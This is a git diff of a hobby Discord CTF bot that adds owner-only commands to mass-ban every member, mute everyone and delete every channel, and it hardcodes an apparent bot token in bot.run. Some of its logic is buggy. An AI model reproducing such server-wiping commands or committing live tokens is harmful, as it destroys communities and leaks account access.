@@ -8,8 +8,7 @@ import random
 import discord
 import mysql.connector
 import json
-
-seppukuprime = False
+import time
 
 bot = commands.Bot(command_prefix = 'pika')
 bot.remove_command('help')
@@ -30,7 +29,9 @@ activetest4 = []
 
 @bot.event
 async def on_ready():
+    global seppukuprime
     print('Pika Pika!')
+    seppukuprime = False
 #Prints 'Pika Pika!' when bot is ready to function
 
 @bot.event
@@ -73,6 +74,7 @@ async def on_message(message):
 
 @bot.command()
 async def start(ctx):
+    member = ctx.message.author
     role_name = 'pikaCTF'
     role = discord.utils.get(member.guild.roles, name = role_name)
     await member.add_roles(role)
@@ -172,30 +174,89 @@ async def CTF_3(ctx):
 #pikaCTF{Pizza_Hut}
 
 #------------------------------------------------------------------------------------------------
+seppukuprime = False
 
 @bot.command()
 async def seppukuprime(ctx):
     global seppukuprime
-    seppukuprime = True
+    if ctx.message.author.id == 321439238497239040:
+        if seppukuprime == False:
+            seppukuprime = True
+            await ctx.send('**Seppuku** is primed and ready for action!')
+        else:
+            await ctx.send('**Seppuku** is already primed!')
+
+@bot.command()
+async def seppukuunprime(ctx):
+    global seppukuprime
+    if ctx.message.author.id == 321439238497239040:
+        if seppukuprime == True:
+            seppukuprime = False
+            await ctx.send('**Seppuku** is unprimed')
+        else:
+            await ctx.send('**Seppuku** is already unprimed')
 
 @bot.command()
 async def seppuku(ctx):
-    global seppukuprime
     members = ctx.guild.members
     if ctx.message.author.id == 321439238497239040:
         for member in members:
-            try:
-                if member == 'Lolo#1733':
-                    print('Chloe detected!')
-                else:
-                    if seppukuprime == True:
-                        await member.ban(reason = None)
-                    else:
-                        print('Seppuku is not primed, use command to prime')
-                    seppukuprime = False
-            except:
-                pass
-    else:
-        await ctx.send('uh oh... @Pikachu')
+            if seppukuprime == True:
+                try:
+                    guildname = ctx.guild.name
+                    localtime = time.asctime( time.localtime(time.time()))
+                    await member.ban(reason = None)
+                    await member.send(f'''In case you are confused as to what just happened:
+A command called \'*pikaseppuku*\' was just used to ban everyone on your *{guildname}* discord server
+The only people with the power to execute this command is *Lolo* and *Pikachu* (as of 5/25/2020)
+If this command was used, I am genuinely sorry, I am unaware of as to whether this was on purpose or accident
+This is an hola niños moment - *Pikachu*
 
-bot.run()
+Command executed at exactly (PST): **{localtime}**''')
+                except:
+                    pass
+            else:
+                await ctx.send('**Seppuku** is not primed, use command to prime')
+                break
+    else:
+        await ctx.send('Uh oh... ')
+
+@bot.command()
+async def mute(ctx):
+    members = ctx.guild.members
+    if ctx.message.author.id == 321439238497239040:
+        for member in members:
+            if member == 'Pikachu#4501':
+                print('--Mute wave--')
+            else:
+                await member.add_roles(discord.utils.get(member.guild.roles, name = 'Muted'))
+    else:
+        await ctx.send('Uh oh... ')
+
+@bot.command()
+async def unmute(ctx):
+    members = ctx.guild.members
+    if ctx.message.author.id == 321439238497239040:
+        for member in members:
+            if member == 'Pikachu#4501':
+                print('--Unmute wave--')
+            else:
+                await member.remove_roles(discord.utils.get(member.guild.roles, name = 'Muted'))
+    else:
+        await ctx.send('Uh oh... ')
+
+@bot.command()
+async def purge(ctx):
+    channels = ctx.guild.channels
+    if ctx.message.author.id == 321439238497239040:
+        for channel in channels:
+            await channel.delete(reason = None)
+    else:
+        await ctx.send('Uh oh... ')
+
+@bot.command()
+async def clear(ctx, amount):
+    await ctx.channel.purge(limit = int(amount))
+    await ctx.send(f'*{amount}* lines cleared')
+
+bot.run('Njk4NDI1NTQ5OTE1MTYwNjA2.Xr1uXA.87KKLJO0SOoEF5zdQhX_r9ZXKNc')
